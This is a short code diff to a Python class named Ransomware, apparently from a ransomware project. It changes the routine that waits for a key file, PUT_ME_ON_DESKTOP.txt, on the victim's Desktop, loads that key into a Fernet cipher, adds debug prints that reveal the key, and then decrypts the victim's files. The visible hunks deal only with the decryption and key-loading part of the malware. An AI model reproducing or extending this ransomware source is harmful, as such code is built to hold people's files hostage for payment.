@@ -96,7 +96,6 @@ class Ransomware:
 
 		# Decrypt Data
 		else :
-
 			_data=self.crypter.decrypt(data)
 			print(f"{file_path} Has Been Decrypted ")
 
@@ -160,10 +159,13 @@ class Ransomware:
 		#Check if key exists on Desktop
 		while True :
 			try :
-				with open(f"{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt",'r') as f:
+				with open(f"{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt",'rb') as f:
 					self.key= f.read()
+					print(f"[+] Read Key From {self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt As {self.key}")
 					self.crypter=Fernet(self.key)
+					print(f"[+] New Cryptor Object Created As : {self.crypter}")
 					self.crypt_system(encrypted=True)
+
 					break
 			except :
 				pass
